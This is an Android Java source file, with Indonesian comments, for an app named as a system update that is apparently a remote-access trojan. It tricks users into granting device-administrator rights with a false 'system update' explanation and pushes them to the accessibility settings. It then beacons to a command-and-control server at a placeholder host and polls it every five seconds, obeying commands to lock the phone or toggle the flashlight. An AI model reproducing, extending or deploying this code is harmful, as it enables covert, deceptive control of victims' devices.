package com.system.update;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    // Ganti IP_LO dengan Link Cloudflare Tunnel / IP VPS
    private String C2_SERVER = "http://IP_LO:8080/command";
    private String REPORT_URL = "http://IP_LO:8080/report";
    
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MyAdmin.class);
        
        // 1. Minta Izin Admin
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk update sistem.");
            startActivity(intent);
        }

        // 2. Minta Izin Accessibility
        Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(accIntent);

        // 3. Laporin IP ke Server
        new Thread(() -> {
            try {
                URL url = new URL(REPORT_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();

        // 4. Loop Cek Command
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCommand();
            }
        }, 0, 5000);
    }

    private void checkCommand() {
        try {
            URL url = new URL(C2_SERVER);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            
            if (conn.getResponseCode() == 200) {
                java.util.Scanner s = new java.util.Scanner(conn.getInputStream()).useDelimiter("\\A");
                String command = s.hasNext() ? s.next() : "";
                
                if (command.equals("LOCK")) dpm.lockNow();
                else if (command.equals("FLASH_ON")) toggleFlash(true);
                else if (command.equals("FLASH_OFF")) toggleFlash(false);
            }
        } catch (Exception e) {}
    }

    private void toggleFlash(boolean status) {
        CameraManager camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = camManager.getCameraIdList()[0];
            camManager.setTorchMode(cameraId, status);
        } catch (Exception e) {}
    }
}
